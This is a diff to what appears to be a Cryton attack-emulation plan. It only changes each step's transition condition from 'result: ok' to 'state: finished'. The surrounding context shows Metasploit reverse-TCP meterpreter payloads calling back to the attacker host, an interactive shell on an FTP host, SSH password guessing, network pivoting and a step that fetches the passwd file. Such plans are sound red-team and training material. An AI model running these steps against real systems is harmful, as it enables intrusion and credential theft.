@@ -21,8 +21,8 @@ stages:
             PAYLOAD: php/meterpreter/reverse_tcp
             LHOST: {{ cryton.host }}
         next:
-          - type: result
-            value: ok
+          - type: state
+            value: finished
             step: create-route-to-network-1
 
       create-route-to-network-1:
@@ -52,8 +52,8 @@ stages:
             RHOSTS: {{ ftp.host }}
             PAYLOAD: cmd/unix/interact
         next:
-          - type: result
-            value: ok
+          - type: state
+            value: finished
             step: create-route-to-network-2
 
       create-route-to-network-2:
@@ -83,8 +83,8 @@ stages:
             PAYLOAD: windows/x64/meterpreter/reverse_tcp
             LHOST: {{ cryton.host }}
         next:
-          - type: result
-            value: ok
+          - type: state
+            value: finished
             step: create-route-to-network-3
 
       create-route-to-network-3:
@@ -114,8 +114,8 @@ stages:
             PASSWORD: {{ ssh.password }}
             STOP_ON_SUCCESS: true
         next:
-          - type: result
-            value: ok
+          - type: state
+            value: finished
             step: get-passwd-file
 
       get-passwd-file:
